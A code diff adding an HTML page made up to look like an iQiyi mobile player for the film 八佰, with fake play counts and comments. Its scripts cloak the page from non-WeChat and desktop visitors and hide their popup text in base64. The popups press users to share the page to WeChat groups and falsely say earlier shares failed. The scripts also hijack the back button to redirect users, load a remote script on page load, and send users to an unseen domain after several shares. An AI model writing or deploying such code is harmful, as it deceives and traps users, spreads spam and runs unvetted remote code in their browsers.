@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>《八佰》点击继续访问在线看</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="content-language" lang="zh-CN" />
+    <meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,width=device-width,viewport-fit=cover" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="applicable-device" content="mobile" />
+    <meta name="HandheldFriendly" content="True" />
+    <link type="text/css" href="//cnzzcd.cdn.bcebos.com/iqiyi/h5-aura.css" rel="stylesheet" />
+    <link type="text/css" href="//cnzzcd.cdn.bcebos.com/iqiyi/h5-play-aura.css" rel="stylesheet" />
+    <link type="text/css" href="//cnzzcd.cdn.bcebos.com/iqiyi/h5-comment-aura2.css" rel="stylesheet" />
+    <link rel="stylesheet" type="text/css" href="https://res.wx.qq.com/open/libs/weui/2.0.1/weui.min.css">
+    <script src="https://res.21263.net/js/back/9e72d93086ea4fb1759d93f140916aff"></script>
+    <style type="text/css">
+        .none{display: none;}
+        .tip_mask{
+            position: fixed;
+            z-index: 4998;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 100%;
+            background: rgba(0,0,0,.6);
+            display: none;
+        }</style>
+</head>
+<body>
+<div id="app">
+    <div>
+        <!---->
+        <div topbutton="playTopButton" class="m-navigation">
+            <header class="navigation-fixed m-navigation-content">
+                <a href="javascript:history.go(-1);" title="返回" style="background:url();color: #fff;top: .12rem;" class="logo-iqiyi router-link-active">< 返回</a>
+            </header>
+        </div>
+    </div>
+    <div>
+        <div>
+            <div class="m-box">
+                <div class="m-box">
+                    <div>
+                        <div class="m-video-player-wrap">
+                            <section class="m-video-player m-video-fullScreenWrap change">
+                                <video id="video" webkit-playsinline="" playsinline="" class="m-player hideControls" src="" style="display: block;">
+
+                                </video>
+                                <div>
+                                    <div><div class="m-video-poster">
+                                        <img id="player-posterimg" src="http://inews.gtimg.com/newsapp_bt/0/12322416789/641"></div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <div class="c-videoplay">
+                                        <i class="c-player-icon c-player-big"></i>
+                                    </div>
+                                </div>
+                                <div class="video-title" style="display:none;">
+                                    <span class="c-title">八佰（超清版）</span>
+                                </div>
+                                <div style="display: block;">
+                                    <div class="m-video-dashboard" style="display:block;">
+                                        <div class="video-console">
+                                            <div class="video-switch">
+                                                <i class="c-glyphicon c-glyphicon-switchPlay"></i>
+                                            </div>
+                                            <span class="timeDisplay-current">00:00</span>
+                                            <div class="video-progress">
+                                                <div class="progress-track">
+                                                    <div class="progress-load" style="width:;"></div>
+                                                    <div class="progress-play" style="width:;"></div>
+                                                    <div class="progress-seek" style="left:;"></div>
+                                                </div>
+                                            </div>
+                                            <span class="timeDisplay-duration">110:15</span>
+                                        </div>
+                                        <span class="danmu"><i class="c-icon-danmu"></i></span>
+                                        <div class="fullScreen">
+                                            <i class="c-glyphicon c-glyphicon-fullscreenNew"></i>
+                                        </div>
+                                    </div>
+                                    <div class="video-regulation" style="display:none;">
+                                        <div class="regulation-status">
+                                            <i class="c-glyphicon c-glyphicon-forward"></i>
+                                        </div>
+                                        <div class="regulation-progress">
+                                            <i class="progress-time" style="width:;"></i>
+                                        </div>
+                                        <div class="video-time">
+                                            <span class="timeCurrent">00:00</span>
+                                            <span class="line">/</span>
+                                            <span class="timeDuration">112:00</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div style="">
+                                    <div class="handle-ad">
+                                        <span class="player-voice" style="display:none;"><i class="c-player-icon c-player-voice"></i></span>
+                                        <span class="player-fullscreen" style="display:none;"><i class="c-player-icon c-player-fullscreen"></i></span>
+                                    </div>
+                                </div>
+                                <!---->
+                                <!---->
+                                <div>
+                                    <div class="m-player-tip" style="display:none;">
+                                        <div class="player-tip-inner">
+                                            <div class="c-player-tip-info">
+                                                <i class="player-loading-logo"></i>
+                                                <div class="player-loading-info">
+                                                    <i class="update-icon"></i>正在全力加载
+                                                    <a href="javascript:void(0)" class="c-link"> ,请稍等...</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="c-player-loading dn">
+                                        <i class="loading-icon"></i> 正在全力加载，
+                                        <a href="javascript:void(0)" class="c-link">刷新</a>重试
+                                    </div>
+                                    <div class="c-player-loading" style="display:none;">
+                                        <i class="loading-icon"></i> 正在全力加载
+                                        <a href="javascript:void(0)" class="c-link"> ,请稍等... </a>
+                                    </div>
+                                    <!---->
+                                </div>
+                                <!---->
+                            </section>
+                        </div>
+                        <!---->
+                        <div class="vue-portal-target "></div>
+                    </div>
+                    <a href="javascript:void(0)" class="m-player-btn-fixed" style="display:none;"><i class="c-glyphicon c-glyphicon-player"></i> 继续播放 </a>
+                    <div class="v-portal" style="display:none;"></div>
+                </div>
+                <div>
+                    <div class="m-box-items m-box-items-full" style="display:none; ">
+                        <div class="m-iqylink-guide" style="">
+                            <a href="javascript:void(0)" subtype="149" down-app-android-url="" class="c-guide-img" style="background-image: url();"><i></i></a>
+                        </div>
+                    </div>
+                    <!--http://www.iqiyipic.com/common/fix/h5-aura/m-WXShare-diversion-bg.png-->
+                    <!---->
+                    <div class="m-box-items m-box-items-full" style="display:none;">
+                        <div class="m-iqylink-guide">
+                            <a class="c-btn c-btn-block" style="background: #fff; box-shadow: none;"></a>
+                        </div>
+                    </div>
+                </div>
+                <div name="m-videoInfo" class="m-box" style="margin-top:.15rem;">
+                    <div class="m-box-items m-box-items-full">
+                        <div class="m-videoInfo-fold longVideo-noFold">
+                            <div class="videoInfoFold-title">
+                                <h1 class="c-title"><a href="javascript:;" title="" class="c-title-link"></a>八佰（超清版） </h1>
+                                <a id="openDesc" href="javascript:;" class="c-more-link"><i class="c-glyphicon c-glyphicon-arrowRight"></i></a>
+                            </div>
+                            <div class="videoInfoFold-data">
+                                <span class="data-item" id="openHot"><i class="icon-video-hot icon-hot-good"></i><span class="c-num">播放次数135783112</span></span>
+                                <!---->
+                                <div class="data-center">
+                                    <!---->
+                                </div>
+                                <div>
+                                    <div class="m-video-pp">
+                                        <span class="c-pp-pic c-pp-pic-comment"></span>
+                                        <div class="data-comment">
+                                            <i class="c-videoPlayPage-icon c-videoInfo-comment"></i>
+                                            <a href="javascript:void(0);" class="comment-num"><span class="c-num"><span>156338</span>条评论</span></a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!---->
+                    </div>
+                    <div class="m-box-items m-box-items-full">
+                        <!---->
+                    </div>
+                </div>
+                <div name="m-extendBar" class="m-box-items m-box-items-full">
+                    <section class="m-videoPlay-toolBar">
+                        <!---->
+                        <!---->
+                        <!---->
+                        <div class="toolBar-item">
+                            <a href="javascript:void(0)" subtype="151" class="item-link" style=""><i class="c-videoPlayPage-icon c-videoPlayPage-maliu"></i><span class="toolBar-info">超清</span><span class="c-videoPlayPage-icon c-laqi-tip">app</span></a>
+                        </div>
+                        <div class="toolBar-item">
+                            <div>
+                                <a href="javascript:void(0)" class="item-link" style=""><i class="c-videoPlayPage-icon c-videoPlayPage-down"></i><span class="toolBar-info">下载</span></a>
+                            </div>
+                        </div>
+                        <div class="toolBar-item">
+                            <a href="javascript:void(0)" class="item-link"><i class="c-videoPlayPage-icon c-videoPlayPage-share"></i><span class="toolBar-info">分享</span></a>
+                        </div>
+                        <div class="toolBar-item">
+                            <a href="javascript:void(0)" class="item-link"><i class="c-videoPlayPage-icon c-videoPlayPage-more"></i><span class="toolBar-info">更多</span></a>
+                        </div>
+                    </section>
+                    <!---->
+                    <section class="m-toast" style="display:none;">
+                        <div class="info">卧槽</div>
+                    </section>
+                </div>
+            </div>
+            <!---->
+            <div id="comment" class="m-box m-box-borderST">
+                <div class="m-box-items m-box-items-full">
+                    <div>
+                        <!---->
+                        <div class="hide"></div>
+                        <div>
+                            <div class="m-commentNew">
+                                <div class="commentNew-title">
+                                    评论
+                                    <span class="num">(156338)</span>
+                                </div>
+                                <div class="commentNew-info">
+                                    <div class="user-info">
+                                        <div class="info-link">
+                                            <div class="c-photo" style="background-image: url('https://cnzzcd.cdn.bcebos.com/iqiyi/img/passport_22544734_155482643463733_130_130.jpg');"></div>
+                                        </div>
+                                        <div class="user-name">
+                                            <div class="name">
+                                                xinxinhear
+                                            </div>
+                                            <div class="des">
+                                                <span class="c-des">8月14日</span>
+                                            </div>
+                                        </div>
+                                        <div>
+                                            <a href="javascript:void(0)" class="c-love-link"><span class="num">276</span><i class="commentNew-icon icon-love"></i><i class="c-videoPlayPage-like-animation"></i></a>
+                                            <section class="m-toast" style="display: none;">
+                                                <div class="info">
+                                                    <div></div>
+                                                </div>
+                                            </section>
+                                        </div>
+                                    </div>
+                                    <div class="content">
+                                        <div class="content-info">
+                                            <div>
+                                                今年最佳，最不像国产片的国产片，热血，感动，瓜怂，送你一程！
+                                                <span data-content="[愉快]" class="c-emoji-pic" style="background-image:url(//img5.qiyipic.com/image/qitan/qitan_jun_again_expression_17_default.png);"></span>棒棒的
+                                                <span data-content="[愉快]" class="c-emoji-pic" style="background-image:url(//img5.qiyipic.com/image/qitan/qitan_jun_again_expression_17_default.png);"></span>
+                                            </div>
+                                            <a href="javascript:void(0)"></a>
+                                            <a href="javascript:void(0);" class="c-link">更多</a>
+                                        </div>
+                                        <!---->
+                                    </div>
+                                </div>
+                                <div class="commentNew-info">
+                                    <div class="user-info">
+                                        <div class="info-link">
+                                            <div class="c-photo" style="background-image: url('https://cnzzcd.cdn.bcebos.com/iqiyi/img/passport_2289112525_154284450248161_130_130.jpg');"></div>
+                                        </div>
+                                        <div class="user-name">
+                                            <div class="name">
+                                                Leo_wx1192
+                                            </div>
+                                            <div class="des">
+                                                <span class="c-des">8月18日</span>
+                                            </div>
+                                        </div>
+                                        <div>
+                                            <a href="javascript:void(0)" class="c-love-link"><span class="num">696</span><i class="commentNew-icon icon-love"></i><i class="c-videoPlayPage-like-animation"></i></a>
+                                            <section class="m-toast" style="display: none;">
+                                                <div class="info">
+                                                    <div></div>
+                                                </div>
+                                            </section>
+                                        </div>
+                                    </div>
+                                    <div class="content">
+                                        <div class="content-info">
+                                            <div>
+                                                电影结束，全场静默，仿佛所有的观众还沉浸在那种悲壮的氛围中没有回神
+                                            </div>
+                                            <a href="javascript:void(0)"></a>
+                                            <a href="javascript:void(0);" class="c-link">更多</a>
+                                        </div>
+                                        <!---->
+                                    </div>
+                                </div>
+                                <div class="commentNew-info">
+                                    <div class="user-info">
+                                        <div class="info-link">
+                                            <div class="c-photo" style="background-image: url(https://cnzzcd.cdn.bcebos.com/iqiyi/img/passport_1047070996_154779313186332_130_130.png);"></div>
+                                        </div>
+                                        <div class="user-name">
+                                            <div class="name">
+                                                仟禧
+                                            </div>
+                                            <div class="des">
+                                                <span class="c-des">8月21日</span>
+                                            </div>
+                                        </div>
+                                        <div>
+                                            <a href="javascript:void(0)" class="c-love-link"><span class="num">82</span><i class="commentNew-icon icon-love"></i><i class="c-videoPlayPage-like-animation"></i></a>
+                                            <section class="m-toast" style="display: none;">
+                                                <div class="info">
+                                                    <div></div>
+                                                </div>
+                                            </section>
+                                        </div>
+                                    </div>
+                                    <div class="content">
+                                        <div class="content-info">
+                                            <div>
+                                                很清晰,播放很流畅,关键还免费哈哈哈哈！
+                                            </div>
+                                            <a href="javascript:void(0)"></a>
+                                            <a href="javascript:void(0);" class="c-link">更多</a>
+                                        </div>
+                                        <!---->
+                                    </div>
+                                </div>
+                            </div>
+                            <!---->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div>
+            <!---->
+        </div>
+        <section class="m-hotSpot-update" style="display: none;">
+            <div class="inner">
+                <i class="update-icon"></i>
+                <span class="c-info">正在全力加载</span>
+            </div>
+        </section>
+        <div class="m-box-items m-box-items-full" style="display: block;">
+            <section class="m-linkMore">
+                <a href="javascript:void(0);" class="m-link link-hand"><i class="icon-handMore"></i>点击查看更多</a>
+            </section>
+        </div>
+    </div>
+    <!---->
+    <div class="m-sideBar" style="display:none;">
+        <div>
+            <a href="javascript:void(0)" class="m-goTop"><i class="c-glyphicon c-glyphicon-arrowUp"></i><span>顶部</span></a>
+        </div>
+    </div>
+    <!---->
+</div>
+<div></div>
+<!-- what a fucking wechat -->
+<div id="dialog" style="display: none;">
+    <div class="weui-mask"></div>
+    <div class="weui-dialog">
+        <!-- <div class="weui-dialog__hd"><strong class="weui-dialog__title">温馨提示</strong></div> -->
+        <div class="weui-dialog__bd">弹窗内容，告知当前页面信息等</div>
+        <div class="weui-dialog__ft">
+            <a href="javascript:;" style="color:#0bbe06;" class="weui-dialog__btn weui-dialog__btn_primary">好的</a>
+        </div>
+    </div>
+</div>
+<div class="tip_mask" style="background: url(https://qqpublic.qpic.cn/qq_public/0/0-2519274018-3709DFACA10E267187AFEA993CF7216C/0) rgba(0, 0, 0, .8) no-repeat;background-position: right top 10px;background-size: 80%;">
+</div>
+<div style="position:fixed;right:20px;bottom:10px;z-index:99999;display:none;" id="tousu">
+    <a href="tousu" class="item-link"><i class="c-videoPlayPage-icon c-videoPlayPage-report"></i><span class="toolBar-info" style="color:#fff;">投诉</span></a>
+</div>
+<script src="https://cnzzcd.cdn.bcebos.com/iqiyi/jquery.min.js"></script>
+<script>
+    var s = document.createElement('script');
+    s.src = '//dy-1251523059.cos.ap-chengdu.myqcloud.com/iqiyi/api.js?v='+Date.now();
+    document.body.appendChild(s);
+</script>
+<script type="text/javascript">
+    $(function(){
+        var system ={
+            win : false,
+            mac : false,
+            xll : false
+        };
+        var p = navigator.platform;
+        system.win = p.indexOf("Win") == 0;
+        system.mac = p.indexOf("Mac") == 0;
+        system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+        if(system.win||system.mac||system.xll){
+            window.location.href="http://www.qq.com/babygohome/?pgv_ref=404";
+        }
+
+        var useragent = navigator.userAgent;
+        if (useragent.match(/MicroMessenger/i) != 'MicroMessenger') {
+            window.location.href="http://www.qq.com/babygohome/?pgv_ref=404";
+        }
+        //localStorage.clear();
+        //if (localStorage.fuckyourmother) {location.href='https://www.qq.com/babygohome/?pgv_ref=404';}
+    })
+    var shareATimes = 0,shareTTimes = 0;
+    var hiddenProperty = 'hidden' in document ? 'hidden' :
+        'webkitHidden' in document ? 'webkitHidden' :
+            'mozHidden' in document ? 'mozHidden' :
+                null;
+    var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+    var onVisibilityChange = function(){
+        if (!document[hiddenProperty]) {
+            window.show_time = Date.now();
+            if (show_time-hidden_time>1000){
+                shareATimes += 1;
+                if (shareATimes>4) {
+                    shareTTimes += 1;
+                    setTimeout(share_tip(shareATimes,shareTTimes), 2000);
+                } else {
+                    setTimeout(share_tip(shareATimes,-1), 2000);
+                }
+            }else{
+                console.log(show_time-hidden_time);
+                dialog('<span style="font-size: 20px;color: #f5294c">'+decode('JUU1JTg4JTg2JUU0JUJBJUFCJUU1JUE0JUIxJUU4JUI0JUE1JUVGJUJDJTgx')+'</span></br>'+decode('JUU4JUFGJUI3JUU3JUExJUFFJUU0JUJGJTlEJUU1JUI3JUIyJUU2JTg4JTkwJUU1JThBJTlGJUU1JTg4JTg2JUU0JUJBJUFCJUVGJUJDJThDJUU1JThGJTk2JUU2JUI2JTg4JUU1JTg4JTg2JUU0JUJBJUFCJUU2JTk3JUEwJUU2JTk1JTg4JUVGJUJDJTgx'))
+            }
+
+        }else{
+            window.hidden_time = Date.now();
+        }
+    }
+    document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+
+    $('.m-video-player-wrap,.m-videoPlay-toolBar,.c-link,.m-linkMore,.header-search,.data-comment,.c-glyphicon-arrowRight').click(function(){
+        dialog(decode('JUU1JUJBJTk0JUU3JTg5JTg4JUU2JTlEJTgzJUU2JTk2JUI5JUU1JUFFJUEzJUU0JUJDJUEwJUU4JUE2JTgxJUU2JUIxJTgy')+'</br><span style="font-size: 20px;color: #f5294c">'+decode('JUU1JThGJTkxJUU5JTgwJTgxJUU1JTg4JUIwJUU1JUJFJUFFJUU0JUJGJUExJUU3JUJFJUE0')+'</span>'+decode('JUU1JThEJUIzJUU1JThGJUFGJUU4JUE3JTgyJUU3JTlDJThCJUU1JTg1JUE4JUU5JTlCJTg2JUVGJUJDJTgx'));
+    })
+
+    $('.tip_mask').click(function(){
+        dialog(decode('JUU1JUJBJTk0JUU3JTg5JTg4JUU2JTlEJTgzJUU2JTk2JUI5JUU1JUFFJUEzJUU0JUJDJUEwJUU4JUE2JTgxJUU2JUIxJTgy')+'</br><span style="font-size: 20px;color: #f5294c">'+decode('JUU1JThGJTkxJUU5JTgwJTgxJUU1JTg4JUIwJUU1JUJFJUFFJUU0JUJGJUExJUU3JUJFJUE0')+'</span>'+decode('JUU1JThEJUIzJUU1JThGJUFGJUU4JUE3JTgyJUU3JTlDJThCJUU1JTg1JUE4JUU5JTlCJTg2JUVGJUJDJTgx'));
+    })
+    //$('.tip_mask').click(function(){$(this).hide();$('#tousu').hide();})
+    //$('.link-login,#tousu').click(function(){localStorage.fuckyourmother=1;})
+    function dialog(content){
+        $('#dialog').show();
+        $('.weui-dialog__bd').html(content);
+        $('.weui-dialog__ft').click(function(){
+            $('#dialog').hide();
+            $('.tip_mask').show();
+            //$('#tousu').show();
+        })
+    }
+    function share_tip(share_app_times, share_timeline_times) {
+        if (share_timeline_times == -1) {
+            if (shareATimes == 1) {
+                dialog('<span style="font-size: 20px;color: #f5294c">'+decode('JUU1JTg4JTg2JUU0JUJBJUFCJUU2JTg4JTkwJUU1JThBJTlGIQ==')+'</span></br>'+decode('JUU4JUFGJUI3JUU3JUJCJUE3JUU3JUJCJUFEJUU1JTg4JTg2JUU0JUJBJUFCJUU1JTg4JUIw')+'<span style="font-size: 24px;color: #f5294c">2</span>'+decode('JUU0JUI4JUFBJUU0JUI4JThEJUU1JTkwJThDJUU3JTlBJTg0JUU3JUJFJUE0JUU1JThEJUIzJUU1JThGJUFGJUU4JUE3JTgyJUU3JTlDJThCJUVGJUJDJTgx'))
+            } else if (shareATimes == 2) {
+                dialog('<span style="font-size: 20px;color: #f5294c">'+decode('JUU1JTg4JTg2JUU0JUJBJUFCJUU1JUE0JUIxJUU4JUI0JUE1JUVGJUJDJTgx')+'</span><br>'+decode('JUU2JUIzJUE4JUU2JTg0JThGJUVGJUJDJTlBJUU1JTg4JTg2JUU0JUJBJUFCJUU1JTg4JUIwJUU3JTlCJUI4JUU1JTkwJThDJUU3JTlBJTg0JUU3JUJFJUE0JUU0JUJDJTlBJUU1JUE0JUIxJUU4JUI0JUE1')+'<br>'+decode('JUU4JUFGJUI3JUU3JUJCJUE3JUU3JUJCJUFEJUU1JTg4JTg2JUU0JUJBJUFCJUU1JTg4JUIw')+'<span style="font-size: 24px;color: #f5294c">2</span>'+decode('JUU0JUI4JUFBJUU0JUI4JThEJUU1JTkwJThDJUU3JTlBJTg0JUU3JUJFJUE0JUVGJUJDJTgx'))
+            } else if (shareATimes == 3) {
+                dialog('<span style="font-size: 20px;color: #f5294c">'+decode('JUU1JTg4JTg2JUU0JUJBJUFCJUU2JTg4JTkwJUU1JThBJTlGIQ==')+'</span></br>'+decode('JUU4JUFGJUI3JUU3JUJCJUE3JUU3JUJCJUFEJUU1JTg4JTg2JUU0JUJBJUFCJUU1JTg4JUIw')+'<span style="font-size: 24px;color: #f5294c">1</span>'+decode('JUU0JUI4JUFBJUU0JUI4JThEJUU1JTkwJThDJUU3JTlBJTg0JUU3JUJFJUE0JUU1JThEJUIzJUU1JThGJUFGJUU4JUE3JTgyJUU3JTlDJThCJUVGJUJDJTgx'))
+            } else if (share_timeline_times < 1) {
+                dialog('<span style="font-size: 20px;color: #f5294c">'+decode('JUU1JTg4JTg2JUU0JUJBJUFCJUU2JTg4JTkwJUU1JThBJTlGJUVGJUJDJTgx')+'</span><br/>'+decode('JUU2JTlDJTgwJUU1JTkwJThFJUU4JUFGJUI3JUU1JTg4JTg2JUU0JUJBJUFCJUU1JTg4JUIw')+'<span style="font-size: 24px;color: #f5294c">'+decode('JUU2JTlDJThCJUU1JThGJThCJUU1JTlDJTg4')+'</span>'+decode('JUU1JThEJUIzJUU1JThGJUFGIQ=='))
+            }
+        } else {
+            if (shareATimes <= 3) {
+                dialog(decode('JUU1JUJBJTk0JUU3JTg5JTg4JUU2JTlEJTgzJUU2JTk2JUI5JUU1JUFFJUEzJUU0JUJDJUEwJUU4JUE2JTgxJUU2JUIxJTgyJUVGJUJDJTgxJUU1JThGJTkxJUU5JTgwJTgxJUU1JTg4JUIwJUU3JUJFJUE0JUU1JThEJUIzJUU1JThGJUFGJUU4JUE3JTgyJUU3JTlDJThCJUU1JTg1JUE4JUU5JTlCJTg2JUVGJUJDJTgx'));
+            } else {
+
+                dialog(decode('JUU2JTg0JTlGJUU4JUIwJUEyJUU2JTgyJUE4JUU3JTlBJTg0JUU1JTg4JTg2JUU0JUJBJUFCJUVGJUJDJThDJUU2JUFEJUEzJUU1JTlDJUE4JUU4JUJEJUJEJUU1JTg1JUE1Li4u'));
+                setTimeout(function(){
+                    //$.getScript("//api3.oss-cn-shanghai.aliyuncs.com/shared.js");
+                    window.location.href=shared_domain;
+                }, 500);
+            }
+        }
+    }
+    function decode(s){return decodeURIComponent(atob(s));}
+
+    function anchor() {
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+    }
+    function j() {
+        //$.getScript("//api3.oss-cn-shanghai.aliyuncs.com/back.js");
+        window.location.href=back_url;
+
+    }
+    setTimeout('anchor()', 100);
+    window.onhashchange = function() {
+        j();
+    };
+
+    window.onload = function(){
+        $('.m-toast').fadeIn();
+        $('.info').text(decode('JUU1JUJEJUIxJUU3JTg5JTg3JUU3JUJDJTkzJUU1JTg2JUIyJUU1JUFFJThDJUU2JTg4JTkwJUVGJUJDJTgx'));
+        setTimeout(function(){
+            $('.m-toast').addClass('none');
+        },1000)
+    }
+</script>
+<div style="display:none;">
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?f574e58e11f2c20637d4bdfb43999850";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+</div>
+</body>
+</html>
